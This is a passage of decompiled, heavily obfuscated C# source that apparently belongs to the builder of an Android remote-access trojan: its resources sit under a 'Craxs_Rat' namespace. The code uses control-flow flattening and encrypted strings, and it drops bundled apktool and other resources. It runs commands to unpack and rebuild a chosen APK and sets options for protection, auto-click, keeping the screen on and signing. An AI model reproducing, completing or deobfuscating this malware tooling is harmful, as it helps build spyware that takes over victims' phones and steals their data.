            continue;
          case 37:
            ((NotificationMaker) this).newconect = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newsokt = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newstrtconct = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -284314064 ^ 990063640;
            continue;
          case 38:
            ((LanguageSelector) this).N__scctrl_ = EXGuarder.\u003706D2032;
            num1 = (int) num2 * -533488385 ^ 116056201;
            continue;
          case 39:
            ((NotificationMaker) this).NEWRANDOM = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).KeepScreen = EXGuarder.\u00342735174;
            ((NotificationMaker) this).ALLPRIMSLIST = new List<string>();
            num1 = (int) num2 * 1828262857 ^ -114133227;
            continue;
          case 40:
            ((NotificationMaker) this).split4 = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 2067802405 ^ -445003759;
            continue;
          case 41:
            ((PermissionsManager) this).Apksignerpath = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1214024211 ^ -1843779747;
            continue;
          default:
            goto label_44;
        }
      }
label_3:
      return;
label_44:;
    }

    public void Translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1372976862;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-(1471680009 - -1866718320) + (~1966668507 ^ -1151019307) - (num2 + 104298789 * ~(-253766190 - ~2063775699 + ~(799948433 ^ -1389145023)) - (-(638403686 + 1230945491 ^ --1491957553) ^ ~(1847931881 * 1060122837 ^ 922149393 ^ -1438337726))) ^ -(-835624297 ^ -325654757) ^ 1088564663 - 468750495) + 324475764)) % 39U)
        {
          case 0:
            this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            this.addactiv.Text = Codes.Translate(this.addactiv.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            this.Label6.Text = Codes.Translate(this.Label6.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            num1 = (int) num3 * -715576458 ^ -1146576300;
            continue;
          case 1:
            int num4 = Operators.CompareString(language, EXGuarder.\u003080A1A3D, false) == 0 ? 1475847170 : (num4 = 1934139711);
            num1 = num4 ^ (int) num3 * 1236804518;
            continue;
          case 2:
            this.Label5.Text = EXGuarder.\u003090B1D0A;
            this.addactiv.Text = EXGuarder.\u00320732D52;
            this.removeactiv.Text = EXGuarder.\u00341080356;
            this.checksuper.Text = EXGuarder.\u00308736060;
            this.checkkill.Text = EXGuarder.\u00357013F48;
            this.checkautoclick.Text = EXGuarder.\u0031C355C58;
            num1 = (int) num3 * 1371023641 ^ 1947632568;
            continue;
          case 3:
            this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, EXGuarder.\u00306650730, EXGuarder.\u0034D41625C);
            num1 = (int) num3 * 825193500 ^ -34087874;
            continue;
          case 4:
            this.maintapcontrols.TabPages[2].Text = EXGuarder.\u00313386932;
            num1 = (int) num3 * 1962634494 ^ 1526926608;
            continue;
          case 5:
            this.titletext.Watermark = EXGuarder.\u0030D3E6C73;
            num1 = (int) num3 * 118405650 ^ 981476326;
            continue;
          case 6:
            this.checkDraw.Text = EXGuarder.\u0032A303910;
            num1 = (int) num3 * -1995125464 ^ 567222941;
            continue;
          case 7:
            this.Label5.Text = EXGuarder.\u00344507324;
            num1 = (int) num3 * -1815981345 ^ 22274678;
            continue;
          case 8:
            goto label_3;
          case 9:
            this.ComboPrims.Text = EXGuarder.\u0032D150F4D;
            this.Label7.Text = EXGuarder.\u00338465757;
            num1 = 2118428023;
            continue;
          case 10:
            this.addactiv.Text = Codes.Translate(this.addactiv.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            num1 = (int) num3 * 2047816098 ^ -189770057;
            continue;
          case 11:
            this.Label3.Text = EXGuarder.\u00344555162;
            num1 = (int) num3 * 140204665 ^ -1875788985;
            continue;
          case 12:
            num1 = (int) num3 * 1720500961 ^ 1689619472;
            continue;
          case 13:
            this.maintapcontrols.TabPages[1].Text = EXGuarder.\u0033E4E5406;
            num1 = (int) num3 * 901051502 ^ 1541312372;
            continue;
          case 14:
            this.Label12.Text = EXGuarder.\u003624B7008;
            this.Button3.Text = EXGuarder.\u0036E457369;
            num1 = (int) num3 * 1591359731 ^ -1079936916;
            continue;
          case 15:
            this.Button1.Text = EXGuarder.\u0031477191A;
            num1 = (int) num3 * -1511234921 ^ 816873502;
            continue;
          case 16:
            this.Button3.Text = EXGuarder.\u0033A1D691B;
            this.maintapcontrols.TabPages[0].Text = EXGuarder.\u00378633A2D;
            this.maintapcontrols.TabPages[1].Text = EXGuarder.\u0033648353F;
            this.maintapcontrols.TabPages[2].Text = EXGuarder.\u0035105253A;
            this.maintapcontrols.TabPages[3].Text = EXGuarder.\u00323294A24;
            this.checkkeepscreen.Text = EXGuarder.\u00309426311;
            num1 = (int) num3 * 757839747 ^ 1800073135;
            continue;
          case 17:
            this.msgtext.Watermark = EXGuarder.\u0034E123554;
            num1 = (int) num3 * -122396231 ^ -512209737;
            continue;
          case 18:
            this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            num1 = (int) num3 * 764077828 ^ 778887068;
            continue;
          case 19:
            goto label_1;
          case 20:
            this.ComboPrims.Text = EXGuarder.\u003514A1D48;
            this.Label7.Text = EXGuarder.\u00324136455;
            num1 = 1892730994;
            continue;
          case 21:
            this.Button1.Text = EXGuarder.\u00356640B35;
            num1 = (int) num3 * -723966264 ^ -1855336389;
            continue;
          case 22:
            this.checkkeepscreen.Text = EXGuarder.\u003070A6B72;
            num1 = (int) num3 * -492667993 ^ 1428502574;
            continue;
          case 23:
            this.Label2.Text = EXGuarder.\u0033305452D;
            num1 = (int) num3 * 481381924 ^ 1446737417;
            continue;
          case 24:
            this.ComboPrims.Text = EXGuarder.\u003072C2C50;
            num1 = (int) num3 * 980067193 ^ 1060447015;
            continue;
          case 25:
            this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            num1 = (int) num3 * 1183312149 ^ 1347544527;
            continue;
          case 26:
            this.Label1.Text = EXGuarder.\u00361071869;
            num1 = (int) num3 * 864522262 ^ 736245936;
            continue;
          case 27:
            this.addactiv.Text = EXGuarder.\u00303514E14;
            this.removeactiv.Text = EXGuarder.\u00371143703;
            num1 = (int) num3 * -762396721 ^ 1256789643;
            continue;
          case 28:
            this.Label6.Text = Codes.Translate(this.Label6.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            num1 = (int) num3 * -1823522103 ^ -82161979;
            continue;
          case 29:
            this.checkkill.Text = EXGuarder.\u003204E3049;
            this.checkautoclick.Text = EXGuarder.\u00379196E53;
            this.checkDraw.Text = EXGuarder.\u0031A000028;
            this.Label14.Text = EXGuarder.\u00370765E0D;
            num1 = (int) num3 * 1128693169 ^ 409977762;
            continue;
          case 30:
            this.checksuper.Text = EXGuarder.\u003084B4115;
            num1 = (int) num3 * -587836945 ^ 1935402385;
            continue;
          case 31:
            this.msgtext.Watermark = EXGuarder.\u00332637143;
            this.Label12.Text = EXGuarder.\u00304652A14;
            this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, EXGuarder.\u00306650730, EXGuarder.\u00326405E5A);
            num1 = (int) num3 * 1347810845 ^ -708713922;
            continue;
          case 32:
            this.maintapcontrols.TabPages[3].Text = EXGuarder.\u0031704065B;
            num1 = (int) num3 * 676903982 ^ -19079979;
            continue;
          case 33:
            this.Label4.Text = EXGuarder.\u0032F286D06;
            num1 = (int) num3 * -970151514 ^ -241711748;
            continue;
          case 34:
            int num5 = Operators.CompareString(language, EXGuarder.\u003643C2377, false) == 0 ? -652756708 : (num5 = -871521964);
            num1 = num5 ^ (int) num3 * 353966116;
            continue;
          case 35:
            this.Label14.Text = EXGuarder.\u0032F394D6A;
            num1 = (int) num3 * -714094955 ^ -1268570836;
            continue;
          case 36:
            this.Label3.Text = EXGuarder.\u0033344045E;
            this.Label1.Text = EXGuarder.\u003234F0A2D;
            this.Label2.Text = EXGuarder.\u0032D0E5024;
            this.Label4.Text = EXGuarder.\u00316724002;
            num1 = (int) num3 * -1217677638 ^ 604964963;
            continue;
          case 37:
            this.titletext.Watermark = EXGuarder.\u00367692B28;
            num1 = (int) num3 * -1038449181 ^ -778238492;
            continue;
          case 38:
            this.maintapcontrols.TabPages[0].Text = EXGuarder.\u0033C613457;
            num1 = (int) num3 * 835808505 ^ 1792730221;
            continue;
          default:
            goto label_41;
        }
      }
label_3:
      return;
label_41:;
    }

    public object RandomShit(int minCharacters, int maxCharacters)
    {
      string str = EXGuarder.\u0032F691E3A;
label_1:
      int num1 = -176249162;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((--(num1 ^ 1615244671 * 990378063 - ~~(-1834954135 - 1880479761) ^ --~-1090553344 * -947765251) ^ (2060411324 ^ 914418739) - 1104793612) - -504673604)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
            num1 = (int) num2 * 733971418 ^ -1637951272;
            continue;
          case 3:
            int num3 = ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init != null ? -829948948 : (num3 = 470204679);
            num1 = num3 ^ (int) num2 * -1079319360;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      bool flag = false;
      try
      {
        Monitor.Enter((object) ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init, ref flag);
label_7:
        int num4 = 1078299364;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) ((--(num4 ^ 1615244671 * 990378063 - ~~(-1834954135 - 1880479761) ^ --~-1090553344 * -947765251) ^ (2060411324 ^ 914418739) - 1104793612) - -504673604)) % 7U)
          {
            case 0:
              goto label_7;
            case 1:
              num4 = (int) num5 * 102322139 ^ -81110192;
              continue;
            case 2:
              ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State = (short) 2;
              ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r = new Random();
              num4 = (int) num5 * 1846700017 ^ 2065309348;
              continue;
            case 3:
              goto label_12;
            case 4:
              int num6 = ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State != (short) 0 ? -1296644892 : (num6 = 1460452264);
              num4 = num6 ^ (int) num5 * 1998621273;
              continue;
            case 6:
              int num7;
              num4 = num7 = ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State != (short) 2 ? -1347383385 : (num7 = 1209305198);
              continue;
            default:
              goto label_20;
          }
        }
label_12:
        throw new IncompleteInitialization();
      }
      finally
      {
        ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State = (short) 1;
label_15:
        int num8 = -1970927877;
        while (true)
        {
          uint num9;
          switch ((num9 = (uint) ((--(num8 ^ 1615244671 * 990378063 - ~~(-1834954135 - 1880479761) ^ --~-1090553344 * -947765251) ^ (2060411324 ^ 914418739) - 1104793612) - -504673604)) % 4U)
          {
            case 1:
              Monitor.Exit((object) ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init);
              num8 = (int) num9 * 47194709 ^ -1741530728;
              continue;
            case 2:
              int num10 = !flag ? -1925881181 : (num10 = 1892893514);
              num8 = num10 ^ (int) num9 * 796196891;
              continue;
            case 3:
              goto label_15;
            default:
              goto label_19;
          }
        }
label_19:;
      }
label_20:
      int num11 = ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r.Next(minCharacters, maxCharacters);
label_21:
      int num12 = 1136111344;
      StringBuilder stringBuilder;
      int num13;
      int num14;
      object obj;
      int startIndex;
      while (true)
      {
        uint num15;
        switch ((num15 = (uint) ((--(num12 ^ 1615244671 * 990378063 - ~~(-1834954135 - 1880479761) ^ --~-1090553344 * -947765251) ^ (2060411324 ^ 914418739) - 1104793612) - -504673604)) % 9U)
        {
          case 1:
            // ISSUE: variable of a reference type
            int& local;
            // ISSUE: explicit reference operation
            int num16 = checked (^(local = ref ((NotificationMaker) this).cou) + 1);
            local = num16;
            num12 = (int) num15 * -350370717 ^ -687276830;
            continue;
          case 2:
            startIndex = ((PermissionsManager) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r.Next(0, str.Length);
            num12 = -1332092343;
            continue;
          case 3:
            stringBuilder = new StringBuilder();
            num13 = num11;
            num14 = 1;
            num12 = (int) num15 * 1559114164 ^ 1108124579;
            continue;
          case 4:
            num12 = (int) num15 * -1943296080 ^ -301806888;
            continue;
          case 5:
            obj = (object) (stringBuilder.ToString() + Conversions.ToString(((NotificationMaker) this).cou));
            num12 = (int) num15 * -822464241 ^ 1368449043;
            continue;
          case 6:
            stringBuilder.Append(str.Substring(startIndex, 1));
            checked { ++num14; }
            num12 = (int) num15 * -1423532028 ^ 556739304;
            continue;
          case 7:
            goto label_21;
          case 8:
            int num17;
            num12 = num17 = num14 <= num13 ? -452435238 : (num17 = 1358369038);
            continue;
          default:
            goto label_30;
        }
      }
label_30:
      return obj;
    }

    private int GenerateRandomNumber(int m0, int m1)
    {
      if (((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init == null)
      {
label_1:
        int num1 = -516350986;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-~num1) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
              num1 = (int) num2 * 65173684 ^ -473675588;
              continue;
            default:
              goto label_4;
          }
        }
      }
label_4:
      bool flag = false;
      try
      {
        Monitor.Enter((object) ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init, ref flag);
label_6:
        int num3 = -1876694320;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ~-~num3) % 8U)
          {
            case 0:
              goto label_6;
            case 1:
              int num5;
              num3 = num5 = ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State != (short) 2 ? -1299827308 : (num5 = -595348973);
              continue;
            case 3:
              goto label_8;
            case 4:
              num3 = (int) num4 * 1033562936 ^ 10649588;
              continue;
            case 5:
              ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State = (short) 2;
              num3 = (int) num4 * -1786366077 ^ -590997896;
              continue;
            case 6:
              int num6 = ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State != (short) 0 ? 967879157 : (num6 = 1250150113);
              num3 = num6 ^ (int) num4 * -270638216;
              continue;
            case 7:
              ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number = new Random();
              num3 = (int) num4 * 940219526 ^ 487358480;
              continue;
            default:
              goto label_19;
          }
        }
label_8:
        throw new IncompleteInitialization();
      }
      finally
      {
        ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State = (short) 1;
        if (flag)
        {
label_15:
          int num7 = -803492370;
          while (true)
          {
            uint num8;
            switch ((num8 = (uint) ~-~num7) % 3U)
            {
              case 0:
                goto label_15;
              case 1:
                Monitor.Exit((object) ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init);
                num7 = (int) num8 * 1750235454 ^ -1382401057;
                continue;
              default:
                goto label_18;
            }
          }
        }
label_18:;
      }
label_19:
      return ((PermissionsManager) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number.Next(m0, m1);
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
      folderBrowserDialog.RootFolder = Environment.SpecialFolder.Desktop;
label_1:
      int num1 = 722809938;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - ~(-(1344207403 + 103285555) * -1875000289 ^ -1290031473 * ~-377723254)) + 2024838732)) % 6U)
        {
          case 0:
            this.FolderPath.Text = folderBrowserDialog.SelectedPath;
            num1 = (int) num2 * 1998932909 ^ -2132504657;
            continue;
          case 1:
            folderBrowserDialog.SelectedPath = EXGuarder.\u0033F1B1001;
            num1 = (int) num2 * -2026182687 ^ -780271915;
            continue;
          case 2:
            goto label_3;
          case 3:
            folderBrowserDialog.Description = EXGuarder.\u0035C0A394F;
            int num3 = folderBrowserDialog.ShowDialog() != DialogResult.OK ? -1934614987 : (num3 = 1786337485);
            num1 = num3 ^ (int) num2 * 1517019284;
            continue;
          case 4:
            this.TheApkPath = this.FolderPath.Text;
            num1 = (int) num2 * -1381911603 ^ -1152321381;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void addactiv_click(object sender, EventArgs e)
    {
      string text = Conversions.ToString(5);
      if (this.FolderPath.Text == null)
        goto label_5;
label_1:
      int num1 = -1177792993;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        OpenFileDialog openFileDialog;
        string[] strArray1;
        string[] strArray2;
        int index;
        string str1;
        string str2;
        switch ((num3 = (uint) ~(142180465 * -1755788928 - -1517288417 * -1691947696 - (~-num2 - ~(-88595742 - 1168819198 - -208008366)) - (71884040 - 703973679))) % 22U)
        {
          case 0:
            goto label_3;
          case 1:
            text = this.FolderPath.Text;
            num1 = (int) num3 * -1613363853 ^ -2044351373;
            continue;
          case 2:
            num1 = (int) num3 * -676776083 ^ -709138404;
            continue;
          case 3:
            openFileDialog.InitialDirectory = text;
            num1 = (int) num3 * 629848650 ^ -1943880413;
            continue;
          case 4:
            index = 0;
            num1 = (int) num3 * -1905812335 ^ 1837136631;
            continue;
          case 5:
            int num4 = this.Activlist.Items.Contains((object) str2.Replace(text, EXGuarder.\u0035E19125C)) ? -1263093699 : (num4 = 1551764832);
            num1 = num4 ^ (int) num3 * 360974495;
            continue;
          case 6:
            strArray1 = openFileDialog.FileNames;
            num1 = (int) num3 * 1051071689 ^ -1062670787;
            continue;
          case 7:
            int num5 = !str2.ToLower().EndsWith(EXGuarder.\u00349056D08) ? -1065973568 : (num5 = -252641079);
            num1 = num5 ^ (int) num3 * 859605312;
            continue;
          case 8:
            str1 = strArray2[index];
            num1 = -1117616923;
            continue;
          case 9:
            goto label_1;
          case 10:
            strArray1 = new string[3];
            num1 = (int) num3 * -344108229 ^ 1026305191;
            continue;
          case 11:
            openFileDialog.Multiselect = true;
            num1 = (int) num3 * 829387067 ^ 1681045729;
            continue;
          case 12:
            openFileDialog.DefaultExt = EXGuarder.\u00349056D08;
            openFileDialog.Title = EXGuarder.\u00352142508;
            num1 = (int) num3 * -2095498554 ^ -623830778;
            continue;
          case 13:
            strArray2 = strArray1;
            num1 = (int) num3 * 102630881 ^ 2143690955;
            continue;
          case 14:
            openFileDialog = new OpenFileDialog();
            num1 = (int) num3 * 956042703 ^ -1998623769;
            continue;
          case 15:
            this.Activlist.Items.Add((object) str2.Replace(text, EXGuarder.\u0035E19125C));
            num1 = (int) num3 * 1572503268 ^ 1791625852;
            continue;
          case 16:
            int num6;
            num1 = num6 = index < strArray2.Length ? 1828236814 : (num6 = -1788900632);
            continue;
          case 17:
            num1 = (int) num3 * -1744131601 ^ -694966487;
            continue;
          case 18:
            checked { ++index; }
            num1 = -1212682360;
            continue;
          case 19:
            int num7 = openFileDialog.ShowDialog() != DialogResult.OK ? -871491165 : (num7 = -599869441);
            num1 = num7 ^ (int) num3 * -2059239943;
            continue;
          case 20:
            goto label_5;
          case 21:
            str2 = str1;
            num1 = (int) num3 * -1685747941 ^ -1883630350;
            continue;
          default:
            goto label_24;
        }
      }
label_3:
      return;
label_24:
      return;
label_5:
      CraxsAlert.ShowWarning(EXGuarder.\u0035D6B0B13);
      num1 = -1309690298;
      goto label_2;
    }

    private string D(string v) => Encoding.UTF8.GetString(Convert.FromBase64String(v));

    private void Button3_Click(object sender, EventArgs e)
    {
      this.log.Text = EXGuarder.\u0030B3E1A19;
label_1:
      int num1 = -101892843;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(--2003400098 + ~529932994 - (-num2 ^ (~(-82887526 - 758691500) ^ -605807510) * -595049575 ^ ~-1877747067 + (-767536277 ^ 835805600) - (-367617872 - 669955363 ^ --1276976507))) ^ 658915178)) % 7U)
        {
          case 0:
            this.Startwork();
            num1 = (int) num3 * 213987994 ^ -1862783751;
            continue;
          case 1:
            this.Button3.Enabled = false;
            num1 = (int) num3 * 397137732 ^ -993146222;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num4 = !this.CheckAllValuse() ? 545723532 : (num4 = 960843209);
            num1 = num4 ^ (int) num3 * 578359395;
            continue;
          case 4:
            goto label_3;
          case 5:
            this.log.Text = EXGuarder.\u0032B6E3E57;
            num1 = -458227831;
            continue;
          case 6:
            this.log.AppendText(EXGuarder.\u003214F0239);
            num1 = (int) num3 * 1568802249 ^ -1780694830;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
    {
      if (string.IsNullOrEmpty(e.Data))
        return;
      try
      {
        // ISSUE: variable of a compiler-generated type
        Jector._Closure\u0024__287\u002D0 closure2870;
        // ISSUE: variable of a compiler-generated type
        Jector._Closure\u0024__287\u002D0 TargetObject = (Jector._Closure\u0024__287\u002D0) new Jector(closure2870);
label_2:
        int num1 = -1425781652;
        while (true)
        {
          int num2 = num1;
          uint num3;
          string command1;
          string path1;
          string command2;
          string path2;
          string command3;
          int num4;
          string path3;
          switch ((num3 = (uint) (-((--1972829669 - --766046073 + (-716585735 - 67024223 + 1332236141 * 269309180) - (num2 * 1781414195 ^ 1692095111 * 1311627935 - -(~-589988725 ^ 1187730831 * 1851040337))) * -831317883) ^ -604088741)) % 61U)
          {
            case 0:
              int num5 = ((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u0033C596E4E) ? 91491091 : (num5 = -429775331);
              num1 = num5 ^ (int) num3 * -1062281441;
              continue;
            case 1:
              ((PermissionsManager) this).originalapkname = Path.GetFileName(this.TargetApktext.Text);
              num1 = (int) num3 * 1087254089 ^ -1638525633;
              continue;
            case 2:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D7)));
              path2 = path1.Replace(EXGuarder.\u0036F6A5A2B, EXGuarder.\u0030B331F2A);
              command3 = EXGuarder.\u0031F5D6567 + ((PermissionsManager) this).Apkeditorpath + EXGuarder.\u0033C36621B + path1 + EXGuarder.\u003383C693C;
              num1 = (int) num3 * 1257658698 ^ 508171645;
              continue;
            case 3:
              File.WriteAllBytes(((PermissionsManager) this).apktoolpath, Craxs_Rat.My.Resources.Resources.apktool);
              num1 = (int) num3 * -2130450016 ^ 584007598;
              continue;
            case 4:
              ((PermissionsManager) this).Once = true;
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D4)));
              num1 = (int) num3 * 1538439326 ^ -731333839;
              continue;
            case 5:
              num1 = (int) num3 * 427660937 ^ -1281902447;
              continue;
            case 6:
              File.Delete(((PermissionsManager) this).outputapk);
              num1 = (int) num3 * -1188376687 ^ 387080463;
              continue;
            case 7:
              int num6;
              num1 = num6 = !File.Exists(path3) ? 1125006805 : (num6 = 1612193784);
              continue;
            case 8:
              File.WriteAllBytes(((PermissionsManager) this).WorkingDir + EXGuarder.\u00353542549, Craxs_Rat.My.Resources.Resources.k);
              num1 = (int) num3 * 696964409 ^ -971490764;
              continue;
            case 9:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D0)));
              num1 = (int) num3 * 892409047 ^ 1269769819;
              continue;
            case 10:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__3)));
              num1 = (int) num3 * 1972436899 ^ 1110722062;
              continue;
            case 11:
              int num7 = num4 <= 30 ? 133310581 : (num7 = 1830997681);
              num1 = num7 ^ (int) num3 * 431130138;
              continue;
            case 12:
              num1 = (int) num3 * 814407796 ^ 1120875774;
              continue;
            case 13:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__2)));
              num1 = (int) num3 * 1239367144 ^ 1552492234;
              continue;
            case 14:
              path1 = path2;
              num1 = (int) num3 * 1871805162 ^ -1489986065;
              continue;
            case 15:
              this.ExecuteCommand(EXGuarder.\u003515A2A10 + ((PermissionsManager) this).apktoolpath + EXGuarder.\u0030866732E + ((PermissionsManager) this).apktemp + EXGuarder.\u00364030C05 + this.TheApkPath + EXGuarder.\u003383C693C);
              num1 = (int) num3 * 1452282844 ^ -885143389;
              continue;
            case 16:
              Thread.Sleep(5000);
              num1 = 1404208334;
              continue;
            case 17:
              Thread.Sleep(1000);
              num1 = -672053662;
              continue;
            case 18:
              File.Delete(path1);
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D9)));
              num1 = (int) num3 * 1712450544 ^ -817058267;
              continue;
            case 19:
              goto label_68;
            case 20:
              int num8;
              num1 = num8 = !File.Exists(path1) ? 1943472635 : (num8 = -730530722);
              continue;
            case 21:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__1)));
              num1 = (int) num3 * 790677732 ^ 84683206;
              continue;
            case 22:
              Thread.Sleep(100);
              num1 = -1445276793;
              continue;
            case 23:
              num1 = (int) num3 * -1283866707 ^ 605615700;
              continue;
            case 24:
              int num9 = !this.checkprotector.Checked ? 2126402527 : (num9 = -1132564072);
              num1 = num9 ^ (int) num3 * 2055477188;
              continue;
            case 25:
              int num10;
              num1 = num10 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u003666F6D61) ? 1934281580 : (num10 = 889959904);
              continue;
            case 26:
              int num11;
              num1 = num11 = !File.Exists(((PermissionsManager) this).outputapk) ? 446431156 : (num11 = 1452883034);
              continue;
            case 27:
              Process.Start(((PermissionsManager) this).WorkingDir + EXGuarder.\u0030D286C0C);
              num1 = (int) num3 * 1378360491 ^ -12502057;
              continue;
            case 28:
              checked { ++num4; }
              num1 = (int) num3 * 1524898237 ^ -1860012767;
              continue;
            case 29:
              num1 = (int) num3 * 128567955 ^ -297862693;
              continue;
            case 30:
              this.ExecuteCommand(command2);
              num1 = (int) num3 * -1519471622 ^ 1464138619;
              continue;
            case 31:
              Thread.Sleep(5000);
              num1 = -875020616;
              continue;
            case 32:
              ((PermissionsManager) this).HoldMainThread = false;
              num1 = (int) num3 * 1125101191 ^ 1469434844;
              continue;
            case 33:
              int num12;
              num1 = num12 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.StartsWith(EXGuarder.\u0032C193425) ? 1864577907 : (num12 = -1556875340);
              continue;
            case 34:
              path3 = ((PermissionsManager) this).WorkingDir + EXGuarder.\u00306654A62 + ((PermissionsManager) this).originalapkname.Replace(EXGuarder.\u0036F6A5A2B, EXGuarder.\u0033C213A23);
              num1 = (int) num3 * -198991326 ^ 1195909535;
              continue;
            case 35:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__287\u002D8)));
              File.WriteAllBytes(((PermissionsManager) this).WorkingDir + EXGuarder.\u0033C0F3009, Craxs_Rat.My.Resources.Resources.c);
              num1 = 1329131121;
              continue;
            case 36:
              int num13;
              num1 = num13 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.StartsWith(EXGuarder.\u003016A0947) ? -1118494670 : (num13 = -1451926389);
              continue;
            case 37:
              int num14;
              num1 = num14 = !((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u00301110006) ? -1945467764 : (num14 = -643886705);
              continue;
            case 38:
              goto label_2;
            case 39:
              int num15;
              num1 = num15 = !(((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u0035167782C) | ((PermissionsManager) TargetObject).\u0024VB\u0024Local_msg.Contains(EXGuarder.\u0032E582074)) ? 832367548 : (num15 = -777482377);
              continue;
            case 40:
              path1 = ((PermissionsManager) this).outputapk.Replace(EXGuarder.\u0031A243215, EXGuarder.\u00360001C14);
              num1 = (int) num3 * -1212729417 ^ -7489661;
              continue;
